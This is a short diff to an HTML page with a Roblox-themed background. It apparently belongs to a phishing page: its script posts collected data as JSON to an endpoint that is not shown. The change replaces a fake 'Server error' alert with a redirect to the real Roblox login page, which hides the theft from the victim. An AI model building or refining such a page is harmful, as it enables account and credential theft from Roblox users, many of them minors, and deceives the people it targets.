@@ -9,7 +9,7 @@
 
         body {
             font-family: 'Roboto', sans-serif;
-            background: url('https://images.alphacoders.com/121/thumb-1920-1217518.jpg') no-repeat center center/cover;
+            background: url('https://images.wallpapersden.com/image/download/roblox-gaming-character_bmZpaW6UmZqaraWkpJRmbmdlrWZlbWU.jpg') no-repeat center center/cover;
             color: white;
             display: flex;
             justify-content: center;
@@ -205,7 +205,8 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
             }).then(() => {
-                alert("Server error.Try again in 5 minutes.");
+                // Redirecting to Roblox login page
+                window.location.href = "https://roblox.com/login";
             });
         }
     </script>
@@ -280,5 +281,4 @@
     </div>
 </body>
 </html>
-
 
